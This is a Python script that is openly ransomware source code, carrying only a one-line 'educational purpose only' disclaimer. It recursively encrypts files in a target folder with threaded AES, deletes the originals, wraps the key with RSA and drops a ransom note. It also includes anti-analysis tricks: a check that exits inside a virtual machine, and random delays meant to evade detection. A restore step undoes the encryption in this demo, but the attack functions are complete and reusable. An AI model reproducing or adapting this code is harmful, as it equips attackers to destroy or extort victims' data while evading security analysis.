import os
import random
import time
import threading
import logging
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import platform
import subprocess

# Obfuscate variable names
log_filename = 'log.txt'
key_len = 32

# Check for Virtual Machine (Anti-analysis)
def is_vm():
    vm_signatures = ['vmware', 'virtualbox', 'qemu', 'xen', 'vbox', 'hyperv']
    system_info = platform.uname().release.lower()
    for signature in vm_signatures:
        if signature in system_info:
            return True
    return False

# Log configuration (Obfuscated)
logging.basicConfig(filename=log_filename, level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')

# Obfuscated function for AES key validation
def check_key(k):
    if len(k) != key_len:
        raise ValueError("Invalid key length!")

# Obfuscated function to encrypt files
def proc_f(f, k):
    try:
        check_key(k)
        
        with open(f, 'rb') as file_obj:
            data = file_obj.read()

        cipher = AES.new(k, AES.MODE_EAX)
        ct, tag = cipher.encrypt_and_digest(data)

        with open(f + ".enc", 'wb') as enc_file:
            [enc_file.write(x) for x in (cipher.nonce, tag, ct)]

        os.remove(f)
        print(f"File '{f}' encrypted and removed.")
    except FileNotFoundError:
        logging.error(f"File not found: {f}")
    except PermissionError:
        logging.error(f"Permission denied: {f}")
    except ValueError as ve:
        logging.error(f"Validation error: {ve}")
    except Exception as e:
        logging.error(f"Error encrypting {f}: {e}")

# Function to decrypt files (Obfuscated)
def dec_f(f, k):
    try:
        check_key(k)
        with open(f, 'rb') as enc_f:
            nonce, tag, ct = [enc_f.read(x) for x in (16, 16, -1)]
            cipher = AES.new(k, AES.MODE_EAX, nonce=nonce)
            data = cipher.decrypt_and_verify(ct, tag)

        with open(f.replace(".enc", ""), 'wb') as out_f:
            out_f.write(data)
        print(f"File '{f}' decrypted.")
    except FileNotFoundError:
        logging.error(f"File not found: {f}")
    except PermissionError:
        logging.error(f"Permission denied: {f}")
    except ValueError as ve:
        logging.error(f"Validation error: {ve}")
    except Exception as e:
        logging.error(f"Error decrypting {f}: {e}")

# Function to create AES key (Obfuscated)
def gen_k():
    return get_random_bytes(key_len)

# Load RSA public key (Obfuscated)
def l_pubk(path):
    try:
        with open(path, 'rb') as file:
            pubkey = RSA.import_key(file.read())
        return pubkey
    except Exception as e:
        logging.error(f"Error loading RSA key: {e}")

# Encrypt AES key with RSA (Obfuscated)
def enc_k(symk, rsapub):
    try:
        cipher_rsa = PKCS1_OAEP.new(rsapub)
        return cipher_rsa.encrypt(symk)
    except Exception as e:
        logging.error(f"Error encrypting key: {e}")

# Function to load file extensions (Obfuscated)
def l_ext(path):
    try:
        with open(path, 'r') as file:
            ext = file.read().splitlines()
        return tuple(ext)
    except Exception as e:
        logging.error(f"Error loading extensions: {e}")
        return ()

# Encrypt files with threads (Obfuscated)
def inf_d(directory, key, ext):
    try:
        threads = []
        for root, dirs, files in os.walk(directory):
            for file in files:
                full_path = os.path.join(root, file)
                if not file.endswith(".enc") and file.lower().endswith(ext):
                    t = threading.Thread(target=proc_f, args=(full_path, key))
                    threads.append(t)
                    t.start()
                    time.sleep(random.uniform(1, 2))  # Add sleep to simulate delay and evade analysis

        for t in threads:
            t.join()

        msg = "".join(["# YOUR FILES HAVE BEEN", " ENCRYPTED! Contact", " us at ", "email@example.com"])
        with open(os.path.join(directory, "RANSOM_NOTE.txt"), "w") as ransom_f:
            ransom_f.write(msg)
        print("Ransom note created.")
    except Exception as e:
        logging.error(f"Error during infection: {e}")

# Restore files (Obfuscated)
def restore_f(directory, key):
    try:
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file.endswith(".enc"):
                    dec_f(os.path.join(root, file), key)
    except Exception as e:
        logging.error(f"Error restoring files: {e}")

# Main
if __name__ == "__main__":
    print("WARNING: Educational purpose only.")
    
    # Anti-analysis: Exit if running in VM
    if is_vm():
        print("Running in a VM, exiting...")
        exit()

    input("Press Enter to continue (Ctrl+C to cancel)...")
    
    aes_k = gen_k()  # Generate AES key

    # Load public RSA key
    pub_k_path = "public_key.pem"
    pub_k = l_pubk(pub_k_path)
    
    # Encrypt the AES key
    enc_aes_k = enc_k(aes_k, pub_k)

    # Load extensions
    ext_path = "extensions.txt"
    exts = l_ext(ext_path)

    # Target directory for encryption
    target_dir = "C:\\TestFolder"  # Update to your target

    # Encrypt the directory
    inf_d(target_dir, aes_k, exts)

    # Restore files for simulation purposes
    restore_f(target_dir, aes_k)
    
    print("Process completed.")